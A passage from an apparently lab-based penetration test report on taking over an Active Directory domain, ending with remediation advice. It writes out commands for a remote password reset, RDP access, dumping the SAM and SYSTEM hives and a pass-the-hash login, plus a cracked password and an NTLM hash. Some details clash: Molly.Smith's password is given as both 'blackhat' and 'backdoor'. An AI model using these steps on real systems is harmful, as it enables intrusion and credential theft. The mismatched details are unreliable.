This confirmed that the `Hazel.Green` user account was secured with a weak and easily guessable password, making it trivial to escalate privileges further within the domain.

As previously shown in the BloodHound graph, this user was a member of the `TIER2-ADMINS` group, which had downstream control over additional privileged users and groups, ultimately enabling **full domain compromise**.

After cracking the password for `Hazel.Green` (`haze1988`), I authenticated to the Domain Controller (`192.168.192.40`) using RPC via `rpcclient`:
```
rpcclient -N  192.168.192.40 -U 'hazel.green%haze1988
```
As a member of the `TIER2-ADMINS` group, `Hazel.Green` had sufficient privileges to perform a remote password reset on users within her influence scope. Using the `setuserinfo2` command, I successfully reset the password for the `MOLLY.SMITH` account to `backdoor`:
```
rpcclient $> setuserinfo2 MOLLY.SMITH 23 backdoor
```
This confirmed that the combination of weak password hygiene, misconfigured user delegation, and excessive privileges allowed me to take control of `MOLLY.SMITH`, a user belonging to the `TIER1-ADMINS` group — who had **RDP access to the Domain Controller** as per BloodHound mapping.

With this, the path to **full domain compromise** was fully achieved and verified.

### Interactive Access to Domain Controller:
With valid credentials for the `MOLLY.SMITH` account (`blackhat`) and confirmed RDP access permissions (`CanRDP` on the Domain Controller), I established a full Remote Desktop session to the DC (`192.168.192.40`) using the following command:
```
xfreerdp /u:molly.smith /p:backdoor /v:192.168.192.40
```
Once inside the desktop environment, I elevated privileges by launching **PowerShell as Administrator**. This provided me with a fully interactive and privileged shell on the domain controller, effectively confirming **complete domain compromise**.
The screenshot below shows the desktop session and elevated PowerShell window, validating interactive and administrative access on the Domain Controller.

<img width="1024" height="768" alt="Pasted image 20250719140634" src="https://github.com/user-attachments/assets/ae507460-3501-4cf0-9a44-dbb797d70a37" />

### Privilege Escalation:
After obtaining an interactive RDP session to the Domain Controller with `MOLLY.SMITH`, I verified the account’s privileges using:
```
whoami /priv 
```
Although `MOLLY.SMITH` had limited privileges, I confirmed the ability to read the **SAM** and **SYSTEM** registry hives:
```
SeBackupPrivilege             Back up files and directories       Disabled
```
```
reg save hklm\sam sam
reg save hklm\system system
```
Using these files, I successfully extracted the **NTLM hash** of the built-in `Administrator` account:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
```
This hash was then used in a **Pass-the-Hash attack** with `evil-winrm` to authenticate as the domain administrator:
```
evil-winrm -i 192.168.192.40 -u Administrator -H d752482897d54e239376fddb2a2109e4

```
The following screenshot shows a successful Evil-WinRM session using the stolen hash of the `Administrator` account:

<img width="640" height="480" alt="Pasted image 20250719141701" src="https://github.com/user-attachments/assets/7a4611f6-47b1-46ac-9b13-96bfc72d524c" />

### Conclusion:
Due to the impact of the overall attack vectors as uncovered by this penetration test,
appropriate resources should be allocated to ensure that remediation efforts are
accomplished in a timely manner. While a comprehensive list of items that should be
implemented is beyond the scope of this engagement, some high level items are
important to mention. Based on the results of the penetration test, I
recommend the following:

1. Patch Management: All assets should be kept current with latest-vendor
supplied security patches. This can be achieved with vendor-native tools or
third party applications, which can provide an overview of all missing patches. In
many instances, third-party tools can also be used for patch deployment
throughout a heterogeneous environment.
2. Credential Management and Protection: Encourage and train employees on
how to use a password manager to securely store such sensitive information.
3. SMB Security Settings: It’s highly recommended to enforce SMB Signing
through Group Policies on all the servers in the domain. To this end, Enable
Microsoft network server. Always digitally sign communications. As well as not sharing plain-text password files.
4. Password Policy: Introduce a domain-wide strong password policy to prevent
brute-forcing attacks to gather clear-text credentials.

I recommend performing penetration tests on a regular basis and to remediate
the vulnerabilities by prioritizing them based on the severity of the issues reported.
